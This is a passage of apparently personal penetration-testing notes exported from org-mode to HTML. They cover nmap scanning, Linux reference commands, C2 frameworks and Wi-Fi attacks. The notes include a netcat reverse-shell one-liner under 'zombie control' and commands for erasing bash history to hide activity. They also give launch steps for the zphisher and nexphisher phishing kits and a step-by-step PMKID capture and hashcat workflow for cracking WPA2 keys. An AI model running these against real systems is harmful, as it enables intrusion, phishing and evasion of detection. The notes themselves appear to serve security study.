+<li>OpenVAS - payloads <a href="https://github.com/greenbone/openvas-scanner">https://github.com/greenbone/openvas-scanner</a>
+<ul class="org-ul">
+<li>GPL - C</li>
+<li>German web site</li>
+</ul></li>
+</ul>
+</div>
+<div id="outline-container-orgac55d30" class="outline-4">
+<h4 id="orgac55d30"><span class="section-number-4">14.1.1</span> Zed Attack Proxy (ZAP) OWASP project</h4>
+<div class="outline-text-4" id="text-14-1-1">
+<ul class="org-ul">
+<li>java</li>
+<li>gradle builder</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org374dc9a" class="outline-4">
+<h4 id="org374dc9a"><span class="section-number-4">14.1.2</span> links</h4>
+<div class="outline-text-4" id="text-14-1-2">
+<ul class="org-ul">
+<li><a href="https://www.zaproxy.org">https://www.zaproxy.org</a></li>
+<li><a href="https://github.com/zaproxy/">https://github.com/zaproxy/</a></li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-org71369bf" class="outline-3">
+<h3 id="org71369bf"><span class="section-number-3">14.2</span> linux .desktop file</h3>
+<div class="outline-text-3" id="text-14-2">
+<ul class="org-ul">
+<li>.desktop file
+<ul class="org-ul">
+<li>Exec=<a href="#org6439e4c">17</a></li>
+</ul></li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org3d7208c" class="outline-3">
+<h3 id="org3d7208c"><span class="section-number-3">14.3</span> webtesting suite</h3>
+<div class="outline-text-3" id="text-14-3">
+<ul class="org-ul">
+<li>scraping</li>
+<li>parsing data</li>
+<li>automated pentesting</li>
+<li>unit testing through selenium - framework, automating tests for web applications across diversified platforms as well
+as browsers</li>
+<li>Credential stuffing</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-org65fe998" class="outline-2">
+<h2 id="org65fe998"><span class="section-number-2">15</span> <span class="todo TODO">TODO</span> exfiltrate data</h2>
+</div>
+<div id="outline-container-org18fb1ff" class="outline-2">
+<h2 id="org18fb1ff"><span class="section-number-2">16</span> Command and Control Center</h2>
+<div class="outline-text-2" id="text-16">
+<ul class="org-ul">
+<li>Cobalt Strike</li>
+<li>Brute Ratel Command and Control Center (Brute Ratel C4 или BRc4) - годовая лицен­зия на Brute Ratel сто­ит 2500$</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org41e581b" class="outline-2">
+<h2 id="org41e581b"><span class="section-number-2">17</span> zombie control <a id="org6439e4c"></a></h2>
+<div class="outline-text-2" id="text-17">
+<ul class="org-ul">
+<li>/usr/bin/mkfifo /tmp/f</li>
+<li>/bin/nc 192.168.1.xx 1234 &lt; /tmp/f | /bin/bash -i &gt; /tmp/f 2&gt;&amp;1 &amp;</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org5b98a31" class="outline-2">
+<h2 id="org5b98a31"><span class="section-number-2">18</span> <span class="todo TODO">TODO</span> </h2>
+<div class="outline-text-2" id="text-18">
+<p>
+SQLi, XSS, Local file inclusion(LFI), and other payloads
+</p>
+
+<p>
+reconnaissance -?
+</p>
+
+<p>
+enumeration/scanning.
+sudo nmap -sV -A -oN optimium.txt &lt;TARGET<sub>IP</sub>&gt;
+</p>
+<ul class="org-ul">
+<li>-sV Probe open ports to determine service/version info.</li>
+<li>-A Enable OS detection, version detection, script scanning, and traceroute.</li>
+<li>-oN Output scan in normal.</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orgb44af11" class="outline-2">
+<h2 id="orgb44af11"><span class="section-number-2">19</span> Linux investigate</h2>
+<div class="outline-text-2" id="text-19">
+<ol class="org-ol">
+<li>version
+<ul class="org-ul">
+<li>uname -a</li>
+<li>ls /etc/*release ; cat ???</li>
+<li>hostnamectl</li>
+</ul></li>
+</ol>
+
+
+
+<ol class="org-ol">
+<li>disks, memory</li>
+<li>vmstat</li>
+</ol>
+</div>
+
+
+
+<div id="outline-container-org894b34c" class="outline-3">
+<h3 id="org894b34c"><span class="section-number-3">19.1</span> all</h3>
+<div class="outline-text-3" id="text-19-1">
+<dl class="org-dl">
+<dt>pwd</dt><dd>Print working directory, i.e., display the name of my current directory on the screen.</dd>
+<dt>hostname</dt><dd>Print the name of the local host (the machine on which I am working). Use netconf (as
+root) to change the name of the machine.</dd>
+<dt>whoami</dt><dd>Print my login name.</dd>
+<dt>id</dt><dd>Print user id (uid) and his/her group id (gid), effective id (if different than the real id) and the supplementary groups.</dd>
+<dt>date</dt><dd>Print the operating system current date, time and timezone. For an ISO standard format, I have to use date -Iseconds. I can change the date and time to 2000-12-31 23:57 using the command date 123123572000 or using these two commands (easier to remember):
+<ul class="org-ul">
+<li>date -set 2000-12-31 To set the hardware (BIOS) clock from the system (Linux) clock, I can use the command (as root) setclock. The international (ISO 8601) standard format for all-numeric date/time has the form: 2001-01-31 (as in Linux default "C" localization). You can be more precise if you wish using, for example: 2001-01-31 23:59:59.999-05:00 (representing I millisecond before February 2001, in a timezone which is 5 hours behind the Universal Coordinated Time (UTC)) . The most "kosher" representation of the same point in time could be: 20010131T235959,999-0500. See the standard at <a href="ftp://ftp.qsl.net/pub/g1smd/8601v03.pdf">ftp://ftp.qsl.net/pub/g1smd/8601v03.pdf</a>.</li>
+<li>date -set 23:57:00</li>
+</ul></dd>
+<dt>time</dt><dd>Determine the amount of time that it takes for a process to complete + other process accounting. Don't confuse it with the date command (see previous entry). E.g. I can find out how long it takes to display a directory content using: time ls. Or I can test the time function with time sleep 10 (time the commands the does nothing for 10 seconds).</dd>
+<dt>clock and hwclock</dt><dd>(two commands, use either). Obtain date/time from the computer hardware (real time, battery-powered) clock. You can also use one of this commands to set the hardware clock, but setclock may be simplier (see command above). Example: hwclock -systohc -utc sets the hardware clock (in UTC) from the system clock.</dd>
+<dt>who</dt><dd>Determine the users logged on the machine.</dd>
+<dt>w</dt><dd>Determine who is logged on the system, find out what they are doing, their processor ussage,
+etc. Handy security command.
+<ul class="org-ul">
+<li>rwho -a (=remote who) Determine users logged on other computers on your network. The rwho service must be enabled for this command to run. If it isn't, run setup (RedHat specific) as root to enable "rwho".</li>
+</ul></dd>
+<dt>last</dt><dd>Show listing of users last logged-in on your system. Really good idea to check it from time to time as a security measure on your system.</dd>
+<dt>lastb</dt><dd>("=last bad") Show the last bad (unsuccessful) login attempts on my system. It did not work on my system, so got it started with: touch /var/log/btmp
+<ul class="org-ul">
+<li>"There's a good reason why /var/log/btmp isn't available on any sane set-up - it's a world-readable file containing login mistakes. Since one of the most common login mistakes is to type the password instead of the username, /var/log/btmp is a gift to crackers." (Thanks to Bruce Richardson). It appears the problem can be solved by changing the file permissions so only root can use "lastb":</li>
+<li>chmod o-r /var/log/btmp</li>
+</ul></dd>
+<dt>history | more</dt><dd>Show the last (1000 or so) commands executed from the command line on the current account. The "| more" causes the display to stop after each screen-full. To see what another user was doing on your system, login as "root" and inspect his/her "history". The history is kept in the file .bash<sub>history</sub> in the user home directory (so yes, it can be modified or erased).</dd>
+<dt>uptime</dt><dd>Show the amount of time since the last reboot.</dd>
+<dt>ps</dt><dd>(="print status" or "process status") List the processes currently run by the current user.</dd>
+<dt>ps axu | more</dt><dd>List all the processes currently running, even those without the controlling
+terminal, together with the name of the user that owns each process.</dd>
+<dt>top</dt><dd><p>
+Keep listing the currently running processes on my computer, sorted by cpu usage (top processes first). Press &lt;Ctrl&gt;c when done.
+</p>
+
+<p>
+PID = process identification.
+USER = name of the user who owns (started?) the process.
+PRI = priority of the process (the higher the number, the lower the priority, normal 0, highest priority is -20, lowest 20.
+NI = niceness level (i.e., if the process tries to be nice by adjusting the priority by the number given). The higher the number, the higher the niceness of the process (i.e., its priority is lower).
+SIZE = kilobytes of code+data+stack taken by the process in memory.
+RSS = kilobytes of physical (silicon) memory taken.
+SHARE = kilobytes of memory shared with other processes.
+STAT = state of the process: S-sleeping, R-running, T-stopped or traced, D-uniterruptable sleep, Z=zombie.
+%CPU = share of the CPU usage (since last screen update).
+%MEM = share of physical memory.
+TIME = total CPU time used by the process (since it was started).
+COMMAND = command line used to start the task (careful with passwords, etc., on command line, all permitted to run "top" may see them!
+</p>
+
+<dl class="org-dl">
+<dt>gtop, ktop and htop</dt><dd>(in X terminal) Three GUI choices for top. My favourite is gtop (comes with gnome). In KDE, ktop is also available from the "K"menu under "System"-"Task Manager".</dd>
+</dl></dd>
+
+<dt>uname -a</dt><dd>(= "Unix name" with option "all") Info on your (local) server. I can also use guname (in X-window terminal) to display the info more nicely.</dd>
+<dt>Xorg -version</dt><dd>Show me the version of X windows I have on my system.</dd>
+<dt>cat /etc/issue</dt><dd>Check what distribution you are using. You can put your own message in this text file - it's displayed on login. It is more common to put your site-specific login message to the file /etc/motd ("motd"="message of the day").</dd>
+<dt>free</dt><dd>Memory info (in kilobytes). "Shared" memory is the memory that can be shared between
+processes (e.g., executable code is "shared"). "Buffered" and "cashed" memory is the part that
+keeps parts of recently accessed files - it can be shrunk if more memory is needed by processes.</dd>
+<dt>df -h</dt><dd>(=disk free) Print disk info about all the filesystems (in human-readable form).</dd>
+<dt>du / -bh | more</dt><dd>(=disk usage) Print detailed disk usage for each subdirectory starting at the
+"/" (root) directory (in human legible form).</dd>
+<dt>cat /proc/cpuinfo</dt><dd>Cpu info - shows the content of the file cpuinfo. Note that the files in the /proc directory are not real files - they are hooks to look at information available to the kernel.</dd>
+<dt>cat /proc/interrupts</dt><dd>List the interrupts in use. May need to find out before setting up new hardware.</dd>
+<dt>cat /proc/version</dt><dd>Linux version and other info.</dd>
+<dt>cat /proc/filesystems</dt><dd>Show the types of filesystems currently in use.</dd>
+<dt>cat /etc/printcap |more</dt><dd>Show the setup of printers.</dd>
+<dt>lsmod</dt><dd>(= "list modules". As root. Use /sbin/lsmod to execute this command when you are a non-root user.) Show the kernel modules currently loaded.</dd>
+<dt>set|more</dt><dd>Show the current user environment (in full). Normally too much to bother.</dd>
+<dt>echo $PATH</dt><dd>Show the content of the environment variable PATH. This command can be used to show other environment variables as well. Use set to see the full environment (see the previous command).</dd>
+<dt>dmesg | less</dt><dd>Print kernel messages (the content of the so-called kernel ring buffer). Press "q" to quit "less". Use less /var/log/dmesg to see what "dmesg" dumped into this file right after the last system bootup.</dd>
+<dt>chage -l my<sub>login</sub><sub>name</sub></dt><dd>See my password expiry information.</dd>
+<dt>quota</dt><dd>See my disk quota (the limits of disk usage).</dd>
+<dt>sysctl -a |more</dt><dd>Display all the configurable Linux kernel parameters.</dd>
+<dt>runlevel</dt><dd>Print the previous and current runlevel. The output "N5" means: "no previous runlevel" and "5 is the current runlevel". To change the runlevel, use "init", e.g., init 1 switches the system to a single user mode.
+<ul class="org-ul">
+<li>Runlevel is the mode of operation of Linux. Runlevel can be switched "on the fly" using the command init. For example, init 3 (as root) will switch me to runlevel 3. The following runlevels are standard:
+0 - halt (Do NOT set initdefault to this)
+1 - Single user mode
+2 - Multiuser, without NFS (The same as 3, if you do not have networking)
+3 - Full multiuser mode
+4 - unused
+5 - X11
+6 - reboot (Do NOT set initdefault to this)</li>
+</ul></dd>
+</dl>
+
+<p>
+The system default runlevel is set in the file: /etc/inittab.
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org0ea12c0" class="outline-2">
+<h2 id="org0ea12c0"><span class="section-number-2">20</span> Linux hide</h2>
+<div class="outline-text-2" id="text-20">
+</div>
+<div id="outline-container-org91c1ac4" class="outline-3">
+<h3 id="org91c1ac4"><span class="section-number-3">20.1</span> bash history</h3>
+<div class="outline-text-3" id="text-20-1">
+<ul class="org-ul">
+<li>history -r clear the Bash history of the current session only</li>
+<li>$ unset HISTFILE Don’t save commands in Bash history for current session</li>
+<li>history -dw 352 Remove a certain line from Bash history</li>
+<li>echo "discreet";history -d $(history 1) - execute command without saving to history</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-org2a3ec0a" class="outline-2">
+<h2 id="org2a3ec0a"><span class="section-number-2">21</span> scanning network</h2>
+<div class="outline-text-2" id="text-21">
+<dl class="org-dl">
+<dt>Banner grabbing</dt><dd>nc www.targethost.com 80</dd>
+<dt>Web crawler</dt><dd>spider or spider bot - idexing</dd>
+</dl>
+<p>
+tools:
+</p>
+<ul class="org-ul">
+<li>netcat - send ASCII over TCP/IP (net-analyzer/netcat)</li>
+</ul>
+</div>
+</div>
+
+
+
+
+<div id="outline-container-org83f6ede" class="outline-2">
+<h2 id="org83f6ede"><span class="section-number-2">22</span> Phishing</h2>
+<div class="outline-text-2" id="text-22">
+<ul class="org-ul">
+<li><a href="https://github.com/htr-tech/zphisher">https://github.com/htr-tech/zphisher</a>
+<ul class="org-ul">
+<li>cd zphisher</li>
+<li>bash zphisher.sh</li>
+</ul></li>
+<li><a href="https://github.com/htr-tech/nexphisher">https://github.com/htr-tech/nexphisher</a>
+<ul class="org-ul">
+<li>git clone</li>
+<li>cd nexphisher</li>
+<li>bash setup</li>
+<li>bash tmux<sub>setup</sub></li>
+<li>bash nexphisher</li>
+</ul></li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orgde86af4" class="outline-2">
+<h2 id="orgde86af4"><span class="section-number-2">23</span> Exploit</h2>
+<div class="outline-text-2" id="text-23">
+<p>
+exploit development framework <a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a>
+</p>
+</div>
+</div>
+<div id="outline-container-orgf5de474" class="outline-2">
+<h2 id="orgf5de474"><span class="section-number-2">24</span> nmap</h2>
+<div class="outline-text-2" id="text-24">
+<p>
+<a href="https://nmap.org/book/host-discovery-specify-targets.html">https://nmap.org/book/host-discovery-specify-targets.html</a>
+</p>
+</div>
+<div id="outline-container-org581780f" class="outline-3">
+<h3 id="org581780f"><span class="section-number-3">24.1</span> theory</h3>
+<div class="outline-text-3" id="text-24-1">
+</div>
+<div id="outline-container-org94bca08" class="outline-4">
+<h4 id="org94bca08"><span class="section-number-4">24.1.1</span> ports</h4>
+<div class="outline-text-4" id="text-24-1-1">
+<ul class="org-ul">
+<li>0 through 1023: Well Known Ports</li>
+<li>1024 through 49151: Registered Ports</li>
+<li>49152 through 65535: Dynamic or Private Ports</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org3136355" class="outline-4">
+<h4 id="org3136355"><span class="section-number-4">24.1.2</span> addressing</h4>
+<div class="outline-text-4" id="text-24-1-2">
+<ul class="org-ul">
+<li>CIDR-style addressing (notation):
+<ul class="org-ul">
+<li>192.168.10.0/24 - 256 hosts</li>
+</ul></li>
+<li>CIDR and octet ranges aren't supported for IPv6 because they are rarely useful</li>
+<li>IPv6 addresses can only be specified by their fully qualified IPv6 address or hostname</li>
+
+<li>-iL filename, or -il - is a standart input</li>
+<li>-iR numtries - get random IPs from global Internet (0 infinity)</li>
+<li>&#x2013;exclude t1,t2,t3  &#x2013;excludefile filename</li>
+</ul>
+
+<p>
+Ex. nmap scanme.nmap.org 192.168.0.0/8 10.0.0,1,3-7
+</p>
+
+<p>
+Dry run:
+</p>
+<ul class="org-ul">
+<li>-sL - list traget to scan</li>
+<li>-n - don't do DNS resolution</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org1299e14" class="outline-4">
+<h4 id="org1299e14"><span class="section-number-4">24.1.3</span> port states</h4>
+<div class="outline-text-4" id="text-24-1-3">
+<p>
+The six port states recognized by Nmap
+</p>
+
+<dl class="org-dl">
+<dt>open</dt><dd>An application is actively accepting TCP connections, UDP datagrams or SCTP
+associations on this port. Finding these is often the primary goal of port
+scanning. Security-minded people know that each open port is an avenue for attack. Attackers and
+pen-testers want to exploit the open ports, while administrators try to close or protect them with
+firewalls without thwarting legitimate users. Open ports are also interesting for non-security
+scans because they show services available for use on the network.</dd>
+<dt>closed</dt><dd>A closed port is accessible (it receives and responds to Nmap probe packets), but there
+is no application listening on it. They can be helpful in showing that a host is up on an IP
+address (host discovery, or ping scanning), and as part of OS detection. Because closed ports are
+reachable, it may be worth scanning later in case some open up. Administrators may want to
+consider blocking such ports with a firewall. Then they would appear in the filtered state,
+discussed next.</dd>
+<dt>filtered</dt><dd>Nmap cannot determine whether the port is open because packet filtering prevents its
+probes from reaching the port. The filtering could be from a dedicated firewall device, router
+rules, or host-based firewall software. These ports frustrate attackers because they provide so
+little information. Sometimes they respond with ICMP error messages such as type 3 code 13
+(destination unreachable: communication administratively prohibited), but filters that simply drop
+probes without responding are far more common. This forces Nmap to retry several times just in
+case the probe was dropped due to network congestion rather than filtering. This slows down the
+scan dramatically.</dd>
+<dt>unfiltered</dt><dd>The unfiltered state means that a port is accessible, but Nmap is unable to
+determine whether it is open or closed. Only the ACK scan, which is used to map firewall rulesets,
+classifies ports into this state. Scanning unfiltered ports with other scan types such as Window
+scan, SYN scan, or FIN scan, may help resolve whether the port is open.</dd>
+<dt>open|filtered</dt><dd>Nmap places ports in this state when it is unable to determine whether a port is
+open or filtered. This occurs for scan types in which open ports give no response. The lack of
+response could also mean that a packet filter dropped the probe or any response it elicited. So
+Nmap does not know for sure whether the port is open or being filtered. The UDP, IP protocol, FIN,
+NULL, and Xmas scans classify ports this way.</dd>
+<dt>closed|filtered</dt><dd>This state is used when Nmap is unable to determine whether a port is closed or
+filtered. It is only used for the IP ID idle scan.</dd>
+</dl>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgd247f05" class="outline-3">
+<h3 id="orgd247f05"><span class="section-number-3">24.2</span> default scan</h3>
+<div class="outline-text-3" id="text-24-2">
+<p>
+Nmap performs a TCP SYN scan against the top 1,000 ports, as specified in the nmap-services file.
+</p>
+</div>
+</div>
+<div id="outline-container-orgabf4c8c" class="outline-3">
+<h3 id="orgabf4c8c"><span class="section-number-3">24.3</span> SCAN TECHNIQUES</h3>
+<div class="outline-text-3" id="text-24-3">
+<ul class="org-ul">
+<li>-sn - ICMP echo (not broadcast), TCP SYNC 443, PCP ACK to port 80
+<ul class="org-ul">
+<li>nmap -sn 192.168.0.1/24</li>
+</ul></li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org08e22af" class="outline-3">
+<h3 id="org08e22af"><span class="section-number-3">24.4</span> nping  Network packet generation tool</h3>
+<div class="outline-text-3" id="text-24-4">
+<p>
+nping -c 1 &#x2013;tcp -p 80,433 scanme.nmap.org google.com
+</p>
+</div>
+</div>
+<div id="outline-container-org1409ef6" class="outline-3">
+<h3 id="org1409ef6"><span class="section-number-3">24.5</span> <span class="todo TODO">TODO</span> ncat - reading, writing, redirecting, and encrypting data across a network</h3>
+</div>
+
+<div id="outline-container-orgafaf537" class="outline-3">
+<h3 id="orgafaf537"><span class="section-number-3">24.6</span> USECASES</h3>
+<div class="outline-text-3" id="text-24-6">
+</div>
+<div id="outline-container-orgacc3d7a" class="outline-4">
+<h4 id="orgacc3d7a"><span class="section-number-4">24.6.1</span> system and version scan</h4>
+<div class="outline-text-4" id="text-24-6-1">
+<ul class="org-ul">
+<li>nmap -O - OS detection</li>
+<li>nmap -sV - open ports service/version</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orgf548072" class="outline-4">
+<h4 id="orgf548072"><span class="section-number-4">24.6.2</span> port scan:</h4>
+<div class="outline-text-4" id="text-24-6-2">
+<ul class="org-ul">
+<li>nmap -p 80 192.168.20.128</li>
+<li>nmap –top-ports 15 196.134.5.67</li>
+<li>nmap -open 198.152.45.33</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orgfad67ba" class="outline-4">
+<h4 id="orgfad67ba"><span class="section-number-4">24.6.3</span> scan subnet</h4>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orga5672fb" class="outline-2">
+<h2 id="orga5672fb"><span class="section-number-2">25</span> wifi</h2>
+<div class="outline-text-2" id="text-25">
+</div>
+<div id="outline-container-org8a5f084" class="outline-3">
+<h3 id="org8a5f084"><span class="section-number-3">25.1</span> net-wireless/kismet</h3>
+<div class="outline-text-3" id="text-25-1">
+<p>
+Channel Hopping - capture while hopping through multiple channels
+</p>
+</div>
+<div id="outline-container-org4ee9a1e" class="outline-4">
+<h4 id="org4ee9a1e"><span class="section-number-4">25.1.1</span> links</h4>
+<div class="outline-text-4" id="text-25-1-1">
+<ul class="org-ul">
+<li>doc <a href="https://www.kismetwireless.net/docs/">https://www.kismetwireless.net/docs/</a></li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-orgd006c95" class="outline-3">
+<h3 id="orgd006c95"><span class="section-number-3">25.2</span> to watch communication</h3>
+<div class="outline-text-3" id="text-25-2">
+<ul class="org-ul">
+<li>need handshake packages captured</li>
+<li>You can force a client to re-authenticate again with a lot of tools so you will instantly get
+this.</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org372a4c6" class="outline-3">
+<h3 id="org372a4c6"><span class="section-number-3">25.3</span> attacks</h3>
+<div class="outline-text-3" id="text-25-3">
+<ul class="org-ul">
+<li><a href="https://wiki.installgentoo.com/wiki/Breaking_WPA2">https://wiki.installgentoo.com/wiki/Breaking_WPA2</a></li>
+</ul>
+</div>
+<div id="outline-container-orgadbcee7" class="outline-4">
+<h4 id="orgadbcee7"><span class="section-number-4">25.3.1</span> attacks</h4>
+<div class="outline-text-4" id="text-25-3-1">
+<ul class="org-ul">
+<li>IV attack - initialization vector (IV) or starting variable (SV)</li>
+<li>KRACK ("Key Reinstallation Attack")</li>
+<li>Packet sniffing</li>
+<li>Near field communication</li>
+<li>Replay attacks</li>
+<li>Rogue access points</li>
+<li>Jamming/Interference</li>
+<li>Evil twin - WPA2 - create an access point using the same ESSID  more powerful signal strength
+<ul class="org-ul">
+<li>s0lst1c3/eaphammer.git</li>
+<li><a href="https://github.com/FluxionNetwork/fluxion">https://github.com/FluxionNetwork/fluxion</a></li>
+</ul></li>
+<li>key reinstallation attacks (KRACK) - WPA2</li>
+<li>War driving</li>
+<li>Bluejacking</li>
+<li>Bluesnarfing</li>
+<li>War chalking</li>
+<li>snooping</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org8206555" class="outline-4">
+<h4 id="org8206555"><span class="section-number-4">25.3.2</span> KRACK (Key Reinstallation Attack)</h4>
+<div class="outline-text-4" id="text-25-3-2">
+<ul class="org-ul">
+<li>repeatedly resetting the nonce transmitted in the third step of the WPA2 handshake.</li>
+<li>obtain the TCP sequence numbers of a connection, and hijack TCP connections.</li>
+<li>Adversary can force the client into using a predictable all-zero encryption key.</li>
+<li>can be patched</li>
+<li>The attack works for both clients and access points</li>
+<li>Adversary can not recover WPA password</li>
+<li>Adversary can not inject packets. (AES-CCMP ONLY)</li>
+<li>Physical Proximity: An attack can only happen when adversary is in physical proximity to and within wireless range of your network</li>
+<li>Time Window: An attack can only happen when a client device is connecting or reconnecting to a Wi-Fi network</li>
+<li>decrypt TCP SYN packets -&gt;  hijack TCP connections</li>
+<li><a href="https://github.com/vanhoefm/krackattacks-scripts">https://github.com/vanhoefm/krackattacks-scripts</a></li>
+<li><a href="https://github.com/kristate/krackinfo">https://github.com/kristate/krackinfo</a></li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orgcb6869a" class="outline-4">
+<h4 id="orgcb6869a"><span class="section-number-4">25.3.3</span> WPA2 brute force</h4>
+<div class="outline-text-4" id="text-25-3-3">
+<p>
+computer can only test 50 to 300 possible keys per second
+</p>
+</div>
+</div>
+<div id="outline-container-org9dfd73f" class="outline-4">
+<h4 id="org9dfd73f"><span class="section-number-4">25.3.4</span> WPS online brute force</h4>
+<div class="outline-text-4" id="text-25-3-4">
+<ul class="org-ul">
+<li>reaver</li>
+<li>bully</li>
+</ul>
+
+<p>
+links
+</p>
+<ul class="org-ul">
+<li>reaver net-wireless/reaver <a href="https://github.com/t6x/reaver-wps-fork-t6x">https://github.com/t6x/reaver-wps-fork-t6x</a>
+<ul class="org-ul">
+<li><a href="https://www.cyberpunk.rs/brute-force-attack-against-wps-reaver">https://www.cyberpunk.rs/brute-force-attack-against-wps-reaver</a></li>
+<li><a href="https://code.google.com/p/reaver-wps/">https://code.google.com/p/reaver-wps/</a></li>
+<li><a href="https://github.com/t6x/reaver-wps-fork-t6x">https://github.com/t6x/reaver-wps-fork-t6x</a></li>
+<li><a href="https://packages.gentoo.org/packages/net-wireless/reaver">https://packages.gentoo.org/packages/net-wireless/reaver</a></li>
+<li><a href="https://www.hackers-arise.com/post/2018/02/07/wireless-hacking-how-to-hack-the-wps-pin-with-reaver">https://www.hackers-arise.com/post/2018/02/07/wireless-hacking-how-to-hack-the-wps-pin-with-reaver</a></li>
+<li><a href="https://outpost24.com/blog/wps-cracking-with-reaver">https://outpost24.com/blog/wps-cracking-with-reaver</a></li>
+</ul></li>
+<li>wpscrack (faster, but only support for major router brands)</li>
+<li>bully <a href="https://www.cyberpunk.rs/bully-wps-brute-force-attack">https://www.cyberpunk.rs/bully-wps-brute-force-attack</a>
+<ul class="org-ul">
+<li><a href="https://github.com/aanarchyy/bully">https://github.com/aanarchyy/bully</a></li>
+</ul></li>
+</ul>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgd584563" class="outline-3">
+<h3 id="orgd584563"><span class="section-number-3">25.4</span> tcpdump</h3>
+<div class="outline-text-3" id="text-25-4">
+<ul class="org-ul">
+<li>tcpdump -D - devices list</li>
+<li>tcpdump -w tcpdump icmp -i 1 - dump device 1</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org242227b" class="outline-3">
+<h3 id="org242227b"><span class="section-number-3">25.5</span> hashcat</h3>
+<div class="outline-text-3" id="text-25-5">
+<ul class="org-ul">
+<li><a href="https://hashcat.net/forum/thread-10253.html">https://hashcat.net/forum/thread-10253.html</a></li>
+<li>all 802.11i/p/q/r networks with roaming functions enabled (most modern routers)</li>
+<li>Pairwise Master Key Identifier (PMKID)-based roaming features enabled</li>
+<li>on the RSN IE (Robust Security Network Information Element) using a single EAPOL (Extensible Authentication
+Protocol over LAN) frame after requesting it from the access point.</li>
+<li>Robust Security Network is a protocol for establishing secure communications over an 802.11 wireless
+network and has PMKID, the key needed to establish a connection between a client and an access point, as one
+of its capabilities.</li>
+<li>hcxdumptool (v4.2.0 or higher), to request the PMKID from the targeted access point and dump the received frame to a file.
+<ul class="org-ul">
+<li>$ ./hcxdumptool -o test.pcapng -i wlp39s0f3u4u5 &#x2013;enable<sub>status</sub></li>
+<li><a href="https://github.com/ZerBea/hcxdumptool">https://github.com/ZerBea/hcxdumptool</a></li>
+</ul></li>
+<li>converted into a hash format accepted by Hashcat.
+<ul class="org-ul">
+<li>$ ./hcxpcaptool -z test.16800 test.pcapng</li>
+<li><a href="https://github.com/ZerBea/hcxtools">https://github.com/ZerBea/hcxtools</a>
+<ul class="org-ul">
+<li>require libssl-dev</li>
+</ul></li>
+</ul></li>
+<li>e Hashcat (v4.2.0 or higher
+<ul class="org-ul">
+<li>./hashcat -m 16800 test.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'</li>
+<li><a href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></li>
+</ul></li>
+<li>PMKID-based roaming features enabled … using IEEE 802.11i/p/r protocols.</li>
+<li>WLAN vendors which send the PMKID in the first message of the 4-way handhake should consider to remove the
+PMKID in WPA2 PSK configured WLANs (non-802.11r). This way the exploit is fully mitigated.</li>
+<li>If you are an 802.11r user in combination with PSK, reflect453 if this is really necessary. [Or] disable WPA2
+Personal in your network completely and rely on WPA2 Enterprise using a secure EAP method (e.g. EAP-TLS,
+PEAP, EAP-TTLS).</li>
+<li><a href="https://techbeacon.com/security/wpa2-hack-allows-wi-fi-password-crack-much-faster">https://techbeacon.com/security/wpa2-hack-allows-wi-fi-password-crack-much-faster</a></li>
+</ul>
+
+<p>
+steps
+</p>
+<ol class="org-ol">
+<li>rc-service wpa<sub>supplicant</sub> down</li>
+<li>Get PMKIDs and / or EAPOL message pairs
+<ul class="org-ul">
+<li>hcxdumptool -i interface -o dumpfile.pcapng &#x2013;active<sub>beacon</sub> &#x2013;enable<sub>status</sub>=15</li>
+</ul></li>
+<li>Convert the traffic to hash format 22000:
+<ul class="org-ul">
+<li>hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng</li>
+</ul></li>
+<li>hashcat -m 22000 hash.hc22000 wordlist.txt # or cracked.txt.gz</li>
+</ol>
+</div>
+</div>
+<div id="outline-container-org117e2ee" class="outline-3">
+<h3 id="org117e2ee"><span class="section-number-3">25.6</span> hcxdumptool</h3>
+<div class="outline-text-3" id="text-25-6">
+<p>
+capture and detect weakness
+</p>
+<ul class="org-ul">
+<li>git clone &#x2013;depth=1 <a href="https://github.com/ZerBea/hcxdumptool">https://github.com/ZerBea/hcxdumptool</a></li>
+<li></li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org25fbfc2" class="outline-3">
+<h3 id="org25fbfc2"><span class="section-number-3">25.7</span> HashCat</h3>
+<div class="outline-text-3" id="text-25-7">
+<ul class="org-ul">
+<li>app-crypt/hashcat</li>
+<li>app-crypt/hashcat-utils</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orgdddbb0f" class="outline-3">
+<h3 id="orgdddbb0f"><span class="section-number-3">25.8</span> john the reaper</h3>
+<div class="outline-text-3" id="text-25-8">
+<ul class="org-ul">
+<li><a href="https://github.com/openwall/john">https://github.com/openwall/john</a></li>
+</ul>
+
+<p>
+john -wordlist:wordlistmy.txt -rules &#x2013;stdout |less
+</p>
+<ul class="org-ul">
+<li>wordlistmy.txt -source rules</li>
+<li>used /etc/john/john.conf - [List.Rules:Wordlist]</li>
+</ul>
+
+
+<p>
+generate password rules
+</p>
+<ul class="org-ul">
+<li>Most people use easy to remember passwords, in this case it has to be 8 characters or over in length</li>
+<li>Append 0-9 to the word, i.e. (word)1, (word)2, (word)3, ..</li>
+<li>Sequence of numbers are often used, e.g. 123, 321, 999, ..</li>
+<li>First letter is often upper-case</li>
+<li>Short words (under 8 characters) are stringed in series of two, e.g. googlegoogle, hellohello, openopen, ..</li>
+<li>Forename and surname often used</li>
+</ul>
+</div>
+
